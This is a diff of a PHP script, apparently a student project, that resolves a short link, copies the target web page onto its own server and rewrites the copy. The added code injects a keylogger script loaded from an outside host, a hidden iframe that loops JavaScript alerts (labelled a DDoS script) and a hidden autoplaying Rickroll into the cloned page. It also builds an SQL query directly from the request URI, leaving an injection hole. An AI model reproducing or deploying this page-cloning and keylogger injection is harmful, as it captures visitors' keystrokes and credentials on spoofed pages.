@@ -15,7 +15,8 @@ if ($conn->connect_error) {
 
 //SEARCHING DATABASE WITH KEY TO GET LONGLINK
 $actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-$key = substr(strrchr($actual_link, "/"), 1);
+//$key = substr(strrchr($actual_link, "/"), 1);
+$key = substr($_SERVER[REQUEST_URI],1,5);
 echo $key;
 $sql = "SELECT longlink FROM DATA WHERE shortlink='{$key}'";
 $result = $conn->query($sql);
@@ -25,8 +26,8 @@ $conn->close();
 
 
 //DUPLICATING HTML FILE ONTO OWN SERVER
-$identifier = substr($key , 0 , 5);
-$htmlFileName = $identifier.".html";
+//$identifier = substr($key , 0 , 5);
+$htmlFileName = "index.html";
 $html=fopen($htmlFileName, "w");
 fwrite($html , file_get_contents("$link"));
 fclose($html);
@@ -48,8 +49,7 @@ foreach($html->find('img') as $element){
 //ADDING IN THE KEYLOGGER SCRIPT INTO HTML ON SERVER
 //ADDING RICKROLL ATTACK TEST
 $keyloggerscript = "http://individualproject.esy.es/js/keylogger.js";
-$ddosscript ="<iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 10;i++){alert("XSS")}' frameborder='0' </iframe>"
-
+$ddosscript ="<iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 10;i++){alert()}' frameborder='0' </iframe>";
 $textToInsert="script src='$keyloggerscript'></script>".$ddosscript."<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
 $contents = file_get_contents("$htmlFileName");
 $newContent = preg_replace("</body>", $textToInsert."</body", $contents);
